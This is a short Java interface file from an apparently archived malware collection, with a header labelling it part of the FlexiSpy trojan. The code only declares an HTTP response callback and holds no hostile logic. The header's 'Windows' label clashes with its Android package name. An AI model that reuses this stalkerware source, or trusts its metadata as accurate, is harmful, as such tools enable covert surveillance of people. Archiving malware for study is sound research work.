/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.fx.android.common.http;


public interface IHttpWrapperCallback {
	
	void onHttpResponse(HttpWrapperResponse aResponse, HttpWrapperException aException);

}
